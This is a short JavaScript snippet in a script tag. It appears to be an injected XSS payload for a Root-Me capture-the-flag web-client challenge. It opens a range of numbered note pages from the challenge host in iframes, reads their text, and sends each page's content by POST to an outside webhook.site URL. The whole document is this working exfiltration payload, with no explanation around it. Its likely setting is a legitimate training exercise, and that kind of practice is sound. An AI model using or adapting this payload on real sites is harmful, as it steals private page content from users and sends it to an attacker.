<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864";

function sleep(ms) {
    const end = Date.now() + ms;
    while (Date.now() < end) {}
}

function run(a = 2800, b = 2840) {
    const container = document.body || document.documentElement;

    for (let i = a; i < b; i++) {
        const iframe = document.createElement("iframe");

        iframe.src = TARGET + i;
        container.appendChild(iframe);

        sleep(500);

        const doc = iframe.contentDocument;
        const text = doc.body.textContent.trim();

        fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                id: i,
                data: text
            })
        });

        console.log("sent", i);
    }
}

run();
</script>
